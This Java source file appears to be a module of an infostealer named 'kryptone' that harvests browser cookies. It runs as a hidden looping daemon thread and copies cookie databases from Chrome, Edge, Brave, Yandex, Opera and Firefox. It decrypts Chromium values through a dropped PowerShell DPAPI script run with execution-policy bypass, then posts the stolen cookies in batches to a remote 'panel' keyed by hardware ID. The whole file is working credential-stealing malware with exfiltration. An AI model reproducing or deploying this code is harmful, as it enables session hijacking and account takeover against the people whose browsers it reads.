package mc.kryptone;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicLong;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

/**
 * Pulls every cookie on the box, decrypts Chromium v10/v11 via DPAPI + AES-GCM,
 * dumps Firefox plaintext, ships JSON to the panel in batches.
 *
 * sqlite3 is used as a read-only dumper (bundled download if absent); DPAPI runs
 * through one PowerShell helper because Java has no native CryptUnprotectData.
 */
public final class CookieDump {
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    public static final AtomicLong LAST_COUNT = new AtomicLong();
    private static final int BATCH = 300;

    public static void start(Config cfg) {
        Thread t = new Thread(() -> {
            try { Thread.sleep(20_000); } catch (InterruptedException e) { return; }
            while (true) {
                try { run(cfg); } catch (Exception e) { Beacon.log("cookies fail: " + e.getMessage()); }
                try { Thread.sleep(Math.max(60_000, cfg.cookieMs)); } catch (InterruptedException e) { return; }
            }
        }, "kryptone-cookies");
        t.setDaemon(true);
        t.start();
    }

    private static final class Row {
        String browser, profile, host, name, value, path;
        long expires;
        boolean secure, httpOnly;
        byte[] enc;
    }

    private static void run(Config cfg) throws Exception {
        String sqlite = ensureSqlite();
        if (sqlite == null) { Beacon.log("sqlite3 unavailable, cookie pass skipped"); return; }

        List<Row> rows = new ArrayList<>();
        collectChromium(cfg, sqlite, rows);
        collectFirefox(sqlite, rows);
        if (rows.isEmpty()) { Beacon.log("no cookies found"); return; }

        decryptAll(cfg, rows);
        List<Row> usable = new ArrayList<>();
        for (Row r : rows) if (r.value != null && !r.value.isBlank()) usable.add(r);

        int sent = 0;
        for (int i = 0; i < usable.size(); i += BATCH) {
            List<Row> chunk = usable.subList(i, Math.min(usable.size(), i + BATCH));
            post(cfg, chunk);
            sent += chunk.size();
        }
        LAST_COUNT.set(sent);
        Beacon.log("cookies shipped=" + sent + "/" + rows.size());
    }

    // ---------------------------------------------------------------- collectors

    private static void collectChromium(Config cfg, String sqlite, List<Row> rows) throws Exception {
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");
        List<Path> roots = new ArrayList<>();
        if (local != null) {
            roots.add(Paths.get(local, "Google", "Chrome", "User Data"));
            roots.add(Paths.get(local, "Microsoft", "Edge", "User Data"));
            roots.add(Paths.get(local, "BraveSoftware", "Brave-Browser", "User Data"));
            roots.add(Paths.get(local, "Yandex", "YandexBrowser", "User Data"));
            roots.add(Paths.get(local, "Opera Software", "Opera Stable"));
        }
        if (home != null) {
            roots.add(Paths.get(home, ".config", "google-chrome"));
            roots.add(Paths.get(home, ".config", "chromium"));
            roots.add(Paths.get(home, ".config", "BraveSoftware", "Brave-Browser"));
        }

        for (Path root : roots) {
            if (!Files.isDirectory(root)) continue;
            Path localState = Files.exists(root.resolve("Local State")) ? root.resolve("Local State") : root.getParent() == null ? null : root.getParent().resolve("Local State");
            byte[] key = null;
            if (isWindows() && localState != null && Files.exists(localState)) {
                key = chromeKey(localState);
            }
            List<Path> profiles = new ArrayList<>();
            boolean direct = Files.exists(root.resolve("Cookies")) || Files.exists(root.resolve("Network").resolve("Cookies"));
            if (direct) profiles.add(root);
            try (var s = Files.list(root)) {
                s.filter(p -> Files.isDirectory(p) && (p.getFileName().toString().equals("Default") || p.getFileName().toString().startsWith("Profile"))).forEach(profiles::add);
            } catch (Exception ignored) {}

            for (Path prof : profiles) {
                Path db = Files.exists(prof.resolve("Network").resolve("Cookies")) ? prof.resolve("Network").resolve("Cookies") : prof.resolve("Cookies");
                if (!Files.exists(db)) continue;
                Path tmp = Files.createTempDirectory("kryptone-ck");
                Path copy = tmp.resolve("Cookies");
                try { Files.copy(db, copy, StandardCopyOption.REPLACE_EXISTING); } catch (Exception e) { continue; }
                String json = query(sqlite, copy,
                        "SELECT host_key,name,hex(encrypted_value),hex(value),path,expires_utc,is_secure,is_httponly FROM cookies;");
                parseChromium(json, root.getFileName().toString() + "/" + prof.getFileName(), key, rows);
                deleteTree(tmp);
            }
        }
    }

    private static void parseChromium(String json, String profile, byte[] key, List<Row> rows) {
        try {
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            for (JsonElement el : arr) {
                JsonObject o = el.getAsJsonObject();
                Row r = new Row();
                r.browser = "chromium";
                r.profile = profile;
                r.host = str(o, "host_key");
                r.name = str(o, "name");
                r.path = str(o, "path");
                r.expires = lng(o, "expires_utc");
                r.secure = "1".equals(str(o, "is_secure"));
                r.httpOnly = "1".equals(str(o, "is_httponly"));
                String plainHex = str(o, "hex(value)");
                String encHex = str(o, "hex(encrypted_value)");
                if (plainHex != null && !plainHex.isEmpty()) {
                    r.value = new String(hex(plainHex), StandardCharsets.UTF_8);
                } else if (encHex != null && !encHex.isEmpty()) {
                    r.enc = hex(encHex);
                    if (key == null) continue; // can't decrypt without the key
                    r.value = decrypt(r.enc, key);
                }
                if (r.value != null) rows.add(r);
            }
        } catch (Exception ignored) {}
    }

    private static void collectFirefox(String sqlite, List<Row> rows) {
        String roaming = System.getenv("APPDATA");
        String home = System.getProperty("user.home");
        List<Path> roots = new ArrayList<>();
        if (roaming != null) roots.add(Paths.get(roaming, "Mozilla", "Firefox", "Profiles"));
        if (home != null) roots.add(Paths.get(home, ".mozilla", "firefox"));
        for (Path root : roots) {
            if (!Files.isDirectory(root)) continue;
            try (var s = Files.list(root)) {
                s.filter(p -> Files.isDirectory(p) && Files.exists(p.resolve("cookies.sqlite"))).forEach(prof -> {
                    try {
                        Path tmp = Files.createTempDirectory("kryptone-ff");
                        Path copy = tmp.resolve("cookies.sqlite");
                        Files.copy(prof.resolve("cookies.sqlite"), copy, StandardCopyOption.REPLACE_EXISTING);
                        String json = query(sqlite, copy,
                                "SELECT host,name,hex(value),path,expiry,isSecure,isHttpOnly FROM moz_cookies;");
                        JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
                        for (JsonElement el : arr) {
                            JsonObject o = el.getAsJsonObject();
                            Row r = new Row();
                            r.browser = "firefox";
                            r.profile = prof.getFileName().toString();
                            r.host = str(o, "host");
                            r.name = str(o, "name");
                            r.path = str(o, "path");
                            r.expires = lng(o, "expiry");
                            r.secure = "1".equals(str(o, "isSecure"));
                            r.httpOnly = "1".equals(str(o, "isHttpOnly"));
                            String v = str(o, "hex(value)");
                            if (v != null && !v.isEmpty()) r.value = new String(hex(v), StandardCharsets.UTF_8);
                            if (r.value != null) rows.add(r);
                        }
                        deleteTree(tmp);
                    } catch (Exception ignored) {}
                });
            } catch (Exception ignored) {}
        }
    }

    // ---------------------------------------------------------------- crypto

    private static void decryptAll(Config cfg, List<Row> rows) {
        List<Row> dpapiRows = new ArrayList<>();
        for (Row r : rows) {
            if (r.enc == null || r.value != null) continue;
            boolean modern = r.enc.length > 3 &&
                    ((r.enc[0] == 'v' && r.enc[1] == '1' && r.enc[2] == '0') ||
                     (r.enc[0] == 'v' && r.enc[1] == '1' && r.enc[2] == '1'));
            if (!modern) dpapiRows.add(r);
        }
        if (!dpapiRows.isEmpty()) {
            List<byte[]> blobs = new ArrayList<>();
            for (Row r : dpapiRows) blobs.add(r.enc);
            List<byte[]> out = dpapi(cfg, blobs);
            for (int i = 0; i < dpapiRows.size(); i++) {
                byte[] p = out.get(i);
                if (p != null) dpapiRows.get(i).value = new String(p, StandardCharsets.UTF_8);
            }
        }
    }

    private static String decrypt(byte[] blob, byte[] key) {
        try {
            if (blob.length < 31) return null;
            if (blob[0] == 'v' && blob[1] == '2' && blob[2] == '0') return null; // app-bound, needs elevation
            if (!(blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1'))) return null;
            byte[] nonce = Arrays.copyOfRange(blob, 3, 15);
            byte[] ct = Arrays.copyOfRange(blob, 15, blob.length - 16);
            byte[] tag = Arrays.copyOfRange(blob, blob.length - 16, blob.length);
            byte[] in = new byte[ct.length + tag.length];
            System.arraycopy(ct, 0, in, 0, ct.length);
            System.arraycopy(tag, 0, in, ct.length, tag.length);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, nonce));
            return new String(c.doFinal(in), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    /** Decrypt the AES key in Local State with DPAPI. */
    private static byte[] chromeKey(Path localState) {
        try {
            JsonObject o = JsonParser.parseString(Files.readString(localState, StandardCharsets.UTF_8)).getAsJsonObject();
            String b64 = o.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
            byte[] raw = Base64.getDecoder().decode(b64);
            if (raw.length > 5 && raw[0] == 'D' && raw[1] == 'P' && raw[2] == 'A' && raw[3] == 'P' && raw[4] == 'I') {
                byte[] blob = Arrays.copyOfRange(raw, 5, raw.length);
                List<byte[]> out = dpapi(null, List.of(blob));
                return out.isEmpty() ? null : out.get(0);
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static List<byte[]> dpapi(Config cfg, List<byte[]> blobs) {
        List<byte[]> res = new ArrayList<>();
        for (int i = 0; i < blobs.size(); i++) res.add(null);
        if (!isWindows() || blobs.isEmpty()) return res;
        try {
            Path dir = Paths.get(System.getProperty("java.io.tmpdir"), "kryptone-dpapi");
            Files.createDirectories(dir);
            Path ps = dir.resolve("dpapi.ps1");
            if (!Files.exists(ps)) {
                Files.writeString(ps, """
                        param([string]$In,[string]$Out)
                        Add-Type -AssemblyName System.Security
                        $lines = [System.IO.File]::ReadAllLines($In)
                        $res = New-Object System.Collections.Generic.List[string]
                        foreach ($l in $lines) {
                          if ([string]::IsNullOrWhiteSpace($l)) { $res.Add(""); continue }
                          try {
                            $b = [Convert]::FromBase64String($l)
                            $u = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
                            $res.Add([Convert]::ToBase64String($u))
                          } catch { $res.Add("") }
                        }
                        [System.IO.File]::WriteAllLines($Out, $res)
                        """, StandardCharsets.UTF_8);
            }
            Path in = dir.resolve("in-" + System.nanoTime() + ".txt");
            Path out = dir.resolve("out-" + System.nanoTime() + ".txt");
            List<String> lines = new ArrayList<>();
            for (byte[] b : blobs) lines.add(Base64.getEncoder().encodeToString(b));
            Files.write(in, lines, StandardCharsets.UTF_8);
            Process p = new ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-File", ps.toString(), "-In", in.toString(), "-Out", out.toString())
                    .redirectErrorStream(true).start();
            p.getInputStream().readAllBytes();
            p.waitFor();
            if (Files.exists(out)) {
                List<String> outs = Files.readAllLines(out, StandardCharsets.UTF_8);
                int n = Math.min(outs.size(), res.size());
                for (int i = 0; i < n; i++) {
                    if (!outs.get(i).isBlank()) res.set(i, Base64.getDecoder().decode(outs.get(i)));
                }
            }
            Files.deleteIfExists(in);
            Files.deleteIfExists(out);
        } catch (Exception ignored) {}
        return res;
    }

    // ---------------------------------------------------------------- plumbing

    private static void post(Config cfg, List<Row> chunk) throws Exception {
        JsonObject body = new JsonObject();
        JsonArray items = new JsonArray();
        for (Row r : chunk) {
            JsonObject o = new JsonObject();
            o.addProperty("browser", r.browser);
            o.addProperty("profile", r.profile);
            o.addProperty("host", r.host);
            o.addProperty("name", r.name);
            o.addProperty("value", r.value);
            o.addProperty("path", r.path);
            o.addProperty("expires", r.expires);
            o.addProperty("secure", r.secure);
            o.addProperty("httpOnly", r.httpOnly);
            items.add(o);
        }
        body.add("items", items);
        body.addProperty("worker", cfg.workerName());
        HttpRequest req = HttpRequest.newBuilder(URI.create(cfg.panelUrl + "/api/cookies/" + Beacon.hwid()))
                .header("Content-Type", "application/json")
                .header("X-Panel-Key", cfg.panelKey)
                .POST(HttpRequest.BodyPublishers.ofString(body.toString(), StandardCharsets.UTF_8))
                .build();
        HttpResponse<String> res = HTTP.send(req, HttpResponse.BodyHandlers.ofString());
        if (res.statusCode() >= 300) Beacon.log("cookie post " + res.statusCode());
    }

    private static String query(String sqlite, Path db, String sql) throws Exception {
        Process p = new ProcessBuilder(sqlite, "-readonly", "-json", db.toString(), sql)
                .redirectErrorStream(true).start();
        byte[] out = p.getInputStream().readAllBytes();
        p.waitFor();
        String s = new String(out, StandardCharsets.UTF_8).trim();
        return s.isEmpty() ? "[]" : s;
    }

    private static String ensureSqlite() {
        Path cached = Config.dir().resolve(isWindows() ? "sqlite3.exe" : "sqlite3");
        if (Files.exists(cached)) return cached.toString();
        try {
            Process p = new ProcessBuilder("sqlite3", "-version").redirectErrorStream(true).start();
            p.getInputStream().readAllBytes();
            if (p.waitFor() == 0) return "sqlite3";
        } catch (Exception ignored) {}
        if (!isWindows()) return null;
        String[] urls = {
                "https://www.sqlite.org/2024/sqlite-tools-win-x64-3460100.zip",
                "https://www.sqlite.org/2024/sqlite-tools-win-x64-3450300.zip"
        };
        for (String url : urls) {
            try {
                Path zip = Config.dir().resolve("sqlite.zip");
                HttpRequest req = HttpRequest.newBuilder(URI.create(url)).GET().build();
                HttpResponse<Path> res = HTTP.send(req, HttpResponse.BodyHandlers.ofFile(zip));
                if (res.statusCode() != 200) continue;
                try (ZipFile z = new ZipFile(zip.toFile())) {
                    var e = z.entries();
                    while (e.hasMoreElements()) {
                        var ent = e.nextElement();
                        if (ent.getName().endsWith("sqlite3.exe")) {
                            try (InputStream in = z.getInputStream(ent)) {
                                Files.copy(in, cached, StandardCopyOption.REPLACE_EXISTING);
                            }
                            Files.deleteIfExists(zip);
                            return cached.toString();
                        }
                    }
                }
                try { Files.deleteIfExists(zip); } catch (Exception ignored) {}
            } catch (Exception ignored) {}
        }
        return null;
    }

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    private static String str(JsonObject o, String k) {
        return o.has(k) && !o.get(k).isJsonNull() ? o.get(k).getAsString() : null;
    }

    private static long lng(JsonObject o, String k) {
        try { return o.has(k) ? o.get(k).getAsLong() : 0; } catch (Exception e) { return 0; }
    }

    private static byte[] hex(String s) {
        if (s == null) return new byte[0];
        int n = s.length() / 2;
        byte[] out = new byte[n];
        for (int i = 0; i < n; i++) out[i] = (byte) Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16);
        return out;
    }

    private static void deleteTree(Path dir) {
        try (var s = Files.walk(dir)) {
            s.sorted(Comparator.reverseOrder()).forEach(p -> { try { Files.deleteIfExists(p); } catch (Exception ignored) {} });
        } catch (Exception ignored) {}
    }
}
